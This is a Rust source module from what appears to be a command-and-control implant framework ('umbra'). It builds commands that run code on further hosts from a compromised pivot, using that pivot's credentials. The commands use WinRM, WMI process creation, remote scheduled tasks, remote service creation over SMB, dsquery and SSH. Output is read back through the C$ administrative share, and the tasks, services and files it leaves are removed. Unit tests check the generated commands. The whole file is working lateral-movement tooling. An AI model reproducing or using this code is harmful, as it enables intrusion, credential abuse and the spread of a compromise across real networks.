//! Remote execution through the pivots the implant already has.
//!
//! The implant does not need a new tunnel to reach a far host: the agent
//! that holds the network path runs the command there, with its own
//! credentials and its own reach.  The operator names the target and the
//! protocol; the server hands the task to the agent that owns the path, and
//! the output comes back through the same pivot.
//!
//! The protocols are the ones a Windows domain speaks every day:
//!
//! * `winrm` -- the remote shell of Windows (`winrs`), which returns the
//!   output of the command directly.
//! * `wmi`   -- the management instrumentation of Windows.  The command is
//!   started through WMI and its output is read back over the
//!   administrative share.
//! * `dcom`  -- the scheduler service over DCOM: the command runs as a
//!   remote task, and the output is read back over the share.
//! * `smb`   -- the service control manager over SMB: a service is created
//!   on the remote host, started, and the output is read back over the
//!   share.
//! * `ldap`  -- the directory services client, which queries the domain
//!   controller the operator named.
//! * `ssh`   -- the secure shell of the host, with the keys of the user the
//!   implant runs as.
//!
//! Everything runs with the credentials the pivot already has: the
//! framework never asks for a password it does not already own.

use crate::upk::Value;

/// The protocols the framework can speak to a remote host.
pub const WMI: &str = "wmi";
pub const SMB: &str = "smb";
pub const WINRM: &str = "winrm";
pub const DCOM: &str = "dcom";
pub const LDAP: &str = "ldap";
pub const SSH: &str = "ssh";

/// The protocols, in the order the operator sees them.
pub const PROTOCOLS: [&str; 6] = [WMI, SMB, WINRM, DCOM, LDAP, SSH];

/// The remote path of the file the command writes its output to.
///
/// The administrative share is the only place every Windows account with
/// administrative rights can write and read, so the output of a command
/// that runs as SYSTEM lands there.
const OUTPUT_DIR: &str = "C:\\Windows\\Temp";

/// The same directory, as the pivot sees it through the administrative
/// share.
///
/// The share is rooted at the drive, so the drive letter of the local
/// path is not part of the path of the share.
const SHARE_DIR: &str = "Windows\\Temp";

/// One remote request.
#[derive(Clone, Debug, Default)]
pub struct Request {
    /// The protocol to speak.
    pub protocol: String,
    /// The host to reach.
    pub target: String,
    /// The command to run there.
    pub command: String,
    /// The account to run it as (empty means the account of the pivot).
    pub user: String,
    /// The name that ties the steps of one request together.
    pub id: String,
    /// How long the whole thing may take, in seconds.
    pub timeout: u64,
}

impl Request {
    /// Read the request out of the task arguments.
    ///
    /// The protocol comes from the kind of the task ("wmi.exec") or from the
    /// arguments, when the operator wants one task for several protocols.
    pub fn from_kind(kind: &str, args: &Value) -> Result<Request, String> {
        let implied = match kind {
            "wmi.exec" => WMI,
            "smb.exec" => SMB,
            "winrm.exec" => WINRM,
            "dcom.exec" => DCOM,
            "ldap.query" => LDAP,
            "ssh.exec" => SSH,
            _ => "",
        };
        let named = args.str_or("protocol", "");
        let protocol = if named.is_empty() {
            implied.to_string()
        } else {
            named.to_lowercase()
        };
        let target = args.str_or("target", "");
        let command = args.str_or("command", "");
        if protocol.is_empty() {
            return Err("remote: the protocol is required".to_string());
        }
        if !PROTOCOLS.contains(&protocol.as_str()) {
            return Err(format!("remote: unknown protocol {protocol:?}"));
        }
        if target.is_empty() {
            return Err("remote: the target is required".to_string());
        }
        if protocol == LDAP {
            // A directory query is a query, not a command.
            if command.is_empty() {
                return Err("remote: the ldap protocol needs a query".to_string());
            }
        } else if command.is_empty() {
            return Err("remote: the command is required".to_string());
        }
        Ok(Request {
            protocol,
            target,
            command,
            user: args.str_or("user", ""),
            id: args.str_or("id", "umbra"),
            timeout: args.u64_or("timeout", 60).clamp(5, 900),
        })
    }

    /// The name of the remote file and of the remote service.
    fn tag(&self) -> String {
        let clean: String = self
            .id
            .chars()
            .filter(|c| c.is_ascii_alphanumeric())
            .take(16)
            .collect();
        if clean.is_empty() {
            "umbra".to_string()
        } else {
            clean
        }
    }
}

/// The result of a remote execution.
#[derive(Clone, Debug, Default)]
pub struct Report {
    /// The protocol that was used.
    pub protocol: String,
    /// The host the command ran on.
    pub target: String,
    /// The output of the command on the remote host.
    pub output: String,
    /// The steps that were taken, in order.
    pub steps: Vec<String>,
    /// The exit code of the driver command.
    pub code: i64,
}

impl Report {
    /// The report the operator reads.
    pub fn text(&self) -> String {
        let mut out = String::new();
        out.push_str(&format!(
            "protocol : {} (target {})\n",
            self.protocol, self.target
        ));
        for step in &self.steps {
            out.push_str(&format!("step     : {step}\n"));
        }
        if self.output.is_empty() {
            out.push_str("output   : (empty)\n");
        } else {
            out.push_str("output   :\n");
            out.push_str(&self.output);
            if !self.output.ends_with('\n') {
                out.push('\n');
            }
        }
        out
    }
}

/// Run a command on a remote host through the pivot.
///
/// The pivot is the machine the task was handed to: it holds the network
/// path to the target, so the command is driven from there.
pub fn execute(request: &Request) -> Result<Report, String> {
    let command = command(request)?;
    let outcome = crate::task::shell(&command, request.timeout);
    let mut report = Report {
        protocol: request.protocol.clone(),
        target: request.target.clone(),
        output: String::from_utf8_lossy(&outcome.out).to_string(),
        steps: vec![command.clone()],
        code: outcome.code,
    };
    if outcome.code != 0 {
        report.steps.push(format!(
            "the driver command failed with the code {}: {}",
            outcome.code, outcome.err
        ));
    }
    Ok(report)
}

/// The command that drives the remote host.
///
/// The function is pure on purpose: the operator (and the test suite) can
/// see exactly what runs on the pivot before it runs anywhere.
pub fn command(request: &Request) -> Result<String, String> {
    let target = request.target.trim();
    let user = request.user.trim();
    match request.protocol.as_str() {
        WINRM => {
            let mut cmd = format!("winrs -r:{target} -u:{user} ");
            cmd.push_str(&quote(&request.command));
            Ok(cmd)
        }
        WMI => {
            // The command runs through WMI and writes its output to the
            // administrative share of the host, where the pivot reads it.
            let tag = request.tag();
            Ok(format!(
                "wmic /node:{target} process call create \"cmd /c ({}) > {OUTPUT_DIR}\\{tag}.txt 2>&1\" && \
                 timeout {} type \\\\{target}\\c$\\{SHARE_DIR}\\{tag}.txt && \
                 del /q \\\\{target}\\c$\\{SHARE_DIR}\\{tag}.txt",
                request.command.replace('"', "'"),
                request.timeout
            ))
        }
        DCOM => {
            let tag = request.tag();
            let time = next_minute();
            Ok(format!(
                "schtasks /s:{target} /create /tn umbra_{tag} /tr \"cmd /c ({}) > {OUTPUT_DIR}\\{tag}.txt 2>&1\" \
                 /sc once /st {time} /ru {user} /f && \
                 schtasks /s:{target} /run /tn umbra_{tag} && \
                 timeout {} type \\\\{target}\\c$\\{SHARE_DIR}\\{tag}.txt && \
                 schtasks /s:{target} /delete /tn umbra_{tag} /f && \
                 del /q \\\\{target}\\c$\\{SHARE_DIR}\\{tag}.txt",
                request.command.replace('"', "'"),
                request.timeout
            ))
        }
        SMB => {
            let tag = request.tag();
            Ok(format!(
                "sc \\\\{target} create umbra_{tag} binPath= \"cmd /c ({}) > {OUTPUT_DIR}\\{tag}.txt 2>&1\" && \
                 sc \\\\{target} start umbra_{tag} && \
                 timeout {} type \\\\{target}\\c$\\{SHARE_DIR}\\{tag}.txt && \
                 sc \\\\{target} delete umbra_{tag} && \
                 del /q \\\\{target}\\c$\\{SHARE_DIR}\\{tag}.txt",
                request.command.replace('"', "'"),
                request.timeout
            ))
        }
        LDAP => {
            let mut cmd = format!("dsquery * -s:{target} ");
            cmd.push_str(&request.command);
            Ok(cmd)
        }
        SSH => {
            let account = if user.is_empty() { "root" } else { user };
            Ok(format!(
                "ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 \
                 {account}@{target} {}",
                quote(&request.command)
            ))
        }
        other => Err(format!("remote: unknown protocol {other:?}")),
    }
}

/// Quote an argument for the shell of the pivot.
fn quote(text: &str) -> String {
    format!("\"{}\"", text.replace('"', "'"))
}

/// The next minute, in the format the scheduler wants.
///
/// The task is created for the next minute and started by hand right away,
/// so the time only has to be a valid one.
fn next_minute() -> String {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let minutes = (now / 60 + 1) % (24 * 60);
    format!("{:02}:{:02}", minutes / 60, minutes % 60)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn request(protocol: &str, target: &str, command: &str) -> Request {
        Request {
            protocol: protocol.to_string(),
            target: target.to_string(),
            command: command.to_string(),
            user: "CORP\\alice".to_string(),
            id: "t-42".to_string(),
            timeout: 30,
        }
    }

    #[test]
    fn the_protocol_is_required() {
        let args = crate::upk::map(vec![("target", crate::upk::s("dc01"))]);
        assert!(Request::from_kind("remote", &args).is_err());
    }

    #[test]
    fn the_kind_carries_the_protocol() {
        let args = crate::upk::map(vec![
            ("target", crate::upk::s("dc01")),
            ("command", crate::upk::s("whoami")),
        ]);
        let request = Request::from_kind("winrm.exec", &args).unwrap();
        assert_eq!(request.protocol, "winrm");
    }

    #[test]
    fn an_unknown_protocol_is_refused() {
        let args = crate::upk::map(vec![
            ("protocol", crate::upk::s("carrier-pigeon")),
            ("target", crate::upk::s("dc01")),
            ("command", crate::upk::s("whoami")),
        ]);
        assert!(Request::from_kind("wmi.exec", &args).is_err());
    }

    #[test]
    fn the_wmi_command_writes_to_the_share_and_reads_it_back() {
        let cmd = command(&request(WMI, "dc01", "whoami")).unwrap();
        assert!(cmd.contains("/node:dc01"));
        assert!(cmd.contains("c$"));
        assert!(cmd.contains("whoami"));
    }

    #[test]
    fn the_ssh_command_carries_the_account() {
        let cmd = command(&request(SSH, "10.0.0.9", "id")).unwrap();
        assert!(cmd.contains("CORP\\alice@10.0.0.9"));
        assert!(cmd.contains("BatchMode=yes"));
    }

    #[test]
    fn the_smb_command_cleans_up_after_itself() {
        let cmd = command(&request(SMB, "web01", "ipconfig")).unwrap();
        assert!(cmd.contains("sc \\\\web01 create"));
        assert!(cmd.contains("sc \\\\web01 delete"));
    }

    #[test]
    fn the_tag_is_always_a_safe_name() {
        let mut req = request(WMI, "dc01", "whoami");
        req.id = "../../evil name".to_string();
        assert_eq!(req.tag(), "evilname");
    }
}
